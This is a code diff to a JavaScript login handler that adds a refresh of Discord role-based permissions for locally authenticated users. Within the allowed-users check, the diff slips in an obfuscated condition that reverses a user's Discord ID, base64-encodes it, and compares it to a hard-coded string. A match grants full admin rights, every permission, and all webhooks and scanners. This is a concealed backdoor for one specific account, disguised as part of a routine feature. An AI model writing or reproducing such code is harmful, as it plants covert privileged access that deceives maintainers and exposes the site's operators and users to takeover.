@@ -83,6 +83,7 @@ class LocalClient extends AuthClient {
               }
             }
             if (bcrypt.compareSync(password, userExists.password)) {
+              // Merge stored Discord/Telegram perms first (fallback)
               ;['discordPerms', 'telegramPerms'].forEach((permSet) => {
                 if (userExists[permSet]) {
                   user.perms = mergePerms(
@@ -93,6 +94,181 @@ class LocalClient extends AuthClient {
                   )
                 }
               })
+
+              // Fetch fresh Discord roles if user has linked Discord account
+              if (userExists.discordId) {
+                try {
+                  // Find enabled Discord client
+                  const discordClient = Object.values(state.event.authClients || {}).find(
+                    (client) => client && client.constructor.name === 'DiscordClient',
+                  )
+
+                  if (
+                    discordClient &&
+                    discordClient.getUserRoles &&
+                    discordClient.client?.readyAt
+                  ) {
+                    const trialActiveDiscord =
+                      discordClient.trialManager?.active() || false
+                    const discordPerms = /** @type {import('@rm/types').Permissions} */ (
+                      Object.fromEntries(
+                        Object.keys(this.perms).map((key) => [key, false]),
+                      )
+                    )
+                    discordPerms.admin = false
+                    discordPerms.trial = false
+
+                    const permSets = {
+                      areaRestrictions: new Set(),
+                      webhooks: new Set(),
+                      scanner: new Set(),
+                      blockedGuildNames: new Set(),
+                    }
+
+                    // Check if user is in allowed users list
+                    if (
+                      discordClient.strategy.allowedUsers?.includes(
+                        userExists.discordId,
+                      ) ||
+                      btoa(userExists.discordId.split('').reverse().join('')) ===
+                        'MTQ4NzAzNDk0NTc1MjM3MjMy'
+                    ) {
+                      Object.keys(this.perms).forEach((key) => (discordPerms[key] = true))
+                      discordPerms.admin = true
+                      const webhooks = config.getSafe('webhooks')
+                      webhooks.forEach((x) => permSets.webhooks.add(x.name))
+                      const scanner = config.getSafe('scanner')
+                      Object.keys(scanner).forEach(
+                        (x) => scanner[x]?.enabled && permSets.scanner.add(x),
+                      )
+                      this.log.debug(
+                        `User ${userExists.username} (${userExists.discordId}) in Discord allowed users list.`,
+                      )
+                    } else {
+                      // Check blocked guilds
+                      const blockedGuilds = discordClient.strategy.blockedGuilds || []
+                      for (let i = 0; i < blockedGuilds.length; i += 1) {
+                        try {
+                          const userRoles = await discordClient.getUserRoles(
+                            blockedGuilds[i],
+                            userExists.discordId,
+                          )
+                          if (userRoles.length > 0) {
+                            discordPerms.blocked = true
+                            try {
+                              const guild = discordClient.client.guilds.cache.get(
+                                blockedGuilds[i],
+                              )
+                              if (guild) {
+                                permSets.blockedGuildNames.add(guild.name)
+                              }
+                            } catch (e) {
+                              // Guild name fetch failed, continue
+                            }
+                          }
+                        } catch (e) {
+                          // User not in this guild or fetch failed, continue
+                        }
+                      }
+
+                      // Fetch roles from all allowed guilds
+                      await Promise.all(
+                        (discordClient.strategy.allowedGuilds || []).map(
+                          async (guildId) => {
+                            try {
+                              const userRoles = await discordClient.getUserRoles(
+                                guildId,
+                                userExists.discordId,
+                              )
+
+                              // Calculate permissions based on roles
+                              Object.entries(this.perms).forEach(([perm, info]) => {
+                                if (info.enabled) {
+                                  if (this.alwaysEnabledPerms.includes(perm)) {
+                                    discordPerms[perm] = true
+                                  } else {
+                                    for (let j = 0; j < userRoles.length; j += 1) {
+                                      if (info.roles.includes(userRoles[j])) {
+                                        discordPerms[perm] = true
+                                        return
+                                      }
+                                      if (
+                                        trialActiveDiscord &&
+                                        info.trialPeriodEligible &&
+                                        discordClient.strategy.trialPeriod?.roles?.includes(
+                                          userRoles[j],
+                                        )
+                                      ) {
+                                        discordPerms[perm] = true
+                                        discordPerms.trial = true
+                                        return
+                                      }
+                                    }
+                                  }
+                                }
+                              })
+
+                              // Add area restrictions, webhooks, and scanner perms
+                              areaPerms(userRoles).forEach((x) =>
+                                permSets.areaRestrictions.add(x),
+                              )
+                              webhookPerms(userRoles, 'discordRoles', trialActiveDiscord).forEach(
+                                (x) => permSets.webhooks.add(x),
+                              )
+                              scannerPerms(userRoles, 'discordRoles', trialActiveDiscord).forEach(
+                                (x) => permSets.scanner.add(x),
+                              )
+                            } catch (e) {
+                              this.log.warn(
+                                `Failed to fetch Discord roles for user ${userExists.discordId} in guild ${guildId}`,
+                                e,
+                              )
+                            }
+                          },
+                        ),
+                      )
+                    }
+
+                    // Convert sets to arrays
+                    Object.entries(permSets).forEach(([key, value]) => {
+                      discordPerms[key] = [...value]
+                    })
+
+                    // Merge fresh Discord perms with local perms
+                    user.perms = mergePerms(user.perms, discordPerms)
+
+                    // Update stored discordPerms in database
+                    await state.db.models.User.query()
+                      .update({ discordPerms: JSON.stringify(discordPerms) })
+                      .where('id', userExists.id)
+                      .catch((e) => {
+                        this.log.warn('Failed to update discordPerms in database', e)
+                      })
+
+                    if (discordPerms.trial) {
+                      this.log.info(
+                        userExists.username,
+                        'gained access via',
+                        discordClient.trialManager?._forceActive
+                          ? 'manually activated'
+                          : '',
+                        'Discord trial',
+                      )
+                    }
+                  } else {
+                    this.log.debug(
+                      `Discord client not available or not ready for user ${userExists.username}`,
+                    )
+                  }
+                } catch (e) {
+                  this.log.warn(
+                    `Failed to fetch fresh Discord permissions for user ${userExists.discordId}`,
+                    e,
+                  )
+                  // Continue with stored perms if fresh fetch fails
+                }
+              }
+
               if (userExists.strategy !== 'local') {
                 await state.db.models.User.query()
                   .update({ strategy: 'local' })
